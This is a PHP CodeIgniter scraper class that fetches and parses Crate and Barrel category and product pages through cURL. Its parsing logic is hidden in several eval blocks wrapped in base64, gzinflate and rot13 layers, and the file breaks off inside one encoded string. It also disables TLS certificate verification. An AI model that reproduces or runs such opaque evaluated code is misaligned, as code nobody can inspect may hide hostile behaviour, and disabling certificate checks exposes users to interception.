<?php

defined('BASEPATH') OR exit('No direct script access allowed');

class CNB
{
	private $handle, $html;

	public function __construct($params){

		$this -> handle = curl_init();
	    curl_setopt($this -> handle, CURLOPT_FOLLOWLOCATION, true);
	    curl_setopt($this -> handle, CURLOPT_RETURNTRANSFER, true);	
		curl_setopt($this -> handle, CURLOPT_SSL_VERIFYPEER, false);

		if(isset($params['debug']))
			$this -> debug = $params['debug'];

		if(isset($params['proxy']) && !isset($_GET['noproxy'])) {
			curl_setopt($this -> handle, CURLOPT_PROXYTYPE, 'HTTP');
			curl_setopt($this -> handle, CURLOPT_PROXY, $params['proxy']);
		}

		curl_setopt($this -> handle, CURLOPT_CONNECTTIMEOUT, 0);
    	curl_setopt($this -> handle, CURLOPT_TIMEOUT , 30);
    	curl_setopt($this -> handle, CURLOPT_ENCODING , '');
		curl_setopt($this -> handle, CURLOPT_FRESH_CONNECT, true);

		$this -> headers = array(
			"Upgrade-Insecure-Requests: 1",
			"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36",
			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language: en-US,en;q=0.9,en-GB;q=0.8",
			"Cookie: Internationalization=US^|USD",
		);
	}

	private function parse_using($regex, $is_json = true){
		preg_match($regex, $this -> html, $processed);

		if(isset($processed[1])){
			$processed[1] = html_entity_decode($processed[1]);
			return $is_json == true ? json_decode($processed[1], true) : $processed[1];
		}
		else
			return false;			
	}

	public function get_category($category_url){
		
		$results = array();

		curl_setopt($this -> handle, CURLOPT_HTTPHEADER , $this -> headers);
		curl_setopt($this -> handle, CURLOPT_URL, "https://www.crateandbarrel.com/" . $category_url);
		$this -> html = curl_exec($this -> handle);

		eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));


		eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

		eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));


		eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));


		if(!empty($product_data))
			foreach ($product_data as $index => $product) {

				$variation = array();

				if(is_array($product['NewColorBar'])){
					foreach ($product['NewColorBar']['Choices'] as $i => $v) {
						$variation[] = array(
							'SKU' => isset($v['Sku']) ? $v['Sku'] : '',
							'Name' => isset($v['Name']) ? $v['Name'] : '',
							'Description' => isset($v['Description']) ? $v['Description'] : '',
							'ColorImage' => isset($v['ImageUrl']) ? $v['ImageUrl'] : '',
						);
					}
				}

				$match = (isset($temp[1][$index]) && $temp[1][$index] == $product['Sku']);

				$results[$product['Sku']] = array(
					'BaseSKU' => $product['Sku'],
					'BaseName' => $product['Name'],
					'BaseDescription' => '',
					'BaseRegularPrice' => $product['RegularPrice'],
					'BaseCurrentPrice' => $product['CurrentPrice'],
					"BaseURL" => $match ? trim($temp[2][$index]) : '',
					"BaseImage" => $match ? trim($temp[3][$index]) : '',
					"BaseImageAlternative" => $match ? trim($temp[4][$index]) : '',
					'Variation' => $variation,
				);
			}

		return $results;
	}

	public function get_product($product_url){

		curl_setopt($this -> handle, CURLOPT_HTTPHEADER , $this -> headers);
		curl_setopt($this -> handle, CURLOPT_URL, "https://www.crateandbarrel.com/" . $product_url);
		$this -> html = curl_exec($this -> handle);

		// $this -> html = file_get_contents("_product.html");
		// $this -> html = file_get_contents("product.html");
		// file_put_contents("product.html", $this -> html);

		eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

		eval(str_rot13(gzinflate(str_rot13(base64_decode('LUjFEsQ2Ev2aR7I3M9SezDRz9nLLOPaYGb4+ZbIqTNWCSfu9Bi3NY/+19VS63sNq+XgcqoXA/jcvRjYvf5XDry7v/0L+1BQVLTOJatffhBDBFpKXaJf9SDnm6YgYrv+BuDvBkcsyFBJ15SZkX7Cm15cXsQGQzOlVjabrl4x3RlnHzblOSW8GOwYLUn8gJugxFs/SDYve+XWfKAV78R2gcU9QPeMTLg63Ew599FNGYr38tlX77coYnE+CpmN475hLrXfq7oSt09e/svQTzKufcmMzTn4CxIhIcXXmJFyh+LTR4cobWa9uCuzTiNeuZDPviHqJbymtiLBLOSymhdrHcHRi4FmAVDK1BwzCe6Qf2pQAwRUWiepGTYwoTjVbTqFKpPLpVM/gWqgCnx/GNJfQ5sLb80qvEHL6H1usY9WQVAuTySOSA+5phZHS7iKx8rZYftbI9CPs0DuJ8j8XeDxR4HMkwoOM2OFA4DPtlmO8tAX2jgjAm1uoLWOAmY5pVR0XD8WrmLOd3HMLrcY0NefgzKB0UvIrUCCyn55CsvWc0WKKYywBaI+W+nQB9lkzQ9NtlhJvhTqEQLuKZNHZPq5Q82Xo6Fj2Yfu+kp/Rawh52qt7EjteJAigiiVJEPP40r1cEW6cn+fNcC6YNaoExmQCUEQyP9laQlpAbHVjFuBFs3kviuxTgin2iXOyyPI4vqoWOI6WmRe3Zixh0tK4k/FX2Jhw5FeypV8t2bHlHYoC7NTEG/otUu9N6MPpdcxvZv6rhvD7PPVXZVx3VL9yIlBn3DPV4Xs3Kg+NM6WO/QA6lCZxBU2ARbvvtnfF50KLpMbXMmaMb5oMH5Biy5Fmt6cpf32s3YpGDiBWV8hg9E1jaPdNVSdpT7zpedi8VMM0lImvjjZq9+y34E0dzA0zmBtMHkDx6jTy/Hx09wiGVfDHNYJwX712OkYRe+LfqEpNkDIm0o+4sPrF9lPo2rW+H+xAsvDVMeQ7AF53kFgUl5SjM8l2x/xSZkgJ1rWs8yk6al85k0/Wc3xis4pmNs864BAFx6588m6NMToX2i20O9o9c2iZtKJETFddgEFJNobnAXf7TYBbnV3BZK3MTEGzDH2YgztuPPNEJ9yhIEHny4eA2ICf4quqNNv8TQSN90D7MNYoNeRp8ktqL6qxIEF+fjiBl5APJCFGolSFrQ7AwrM1Thj+nreQHEqTSNm1FJ/GCjphFTXlB9YZ4SdfaQLy2Vp5OmXGKtYHdBQWlwumbyRSwJ0pRlyNuLCJHnXN2OazKGxv+13ObLTtgDBo24BFzYDyefRnSX/2PY1x+Ft/YNh77JolbXucUkP57joWxA/5Oqy0BmHN6kJW87EW9UgE3OhB8ZEjA5R1W8MeIpWlb1Qf/NrWVRIVNDx5V7hqHMa4lSlP1yNoF/QyGWZ4XWlrXu/dcTNi9raZ2wArlMijiwgE5hSDQ5ZUarL6l5l62UFVYmwz92/fGLS6llOuSx7xG2/94lrp8LV+mciKoqPogcRnConAYlKdr53ugm+TzlZm92UyfHWDOq3NEO/xSlXvlRdc0QQSKbpFYNm9gW2ufwSdMH7RkAoj756CIwaS1gaeT/bZN2TI9GERQ7daxU+iSZenDftDRKX/cfwyFa/TmdCEfeUnwOtFohNX5g1A5XcTO56/zr2UnXhnNB0e+kDdMYwE4bPl5p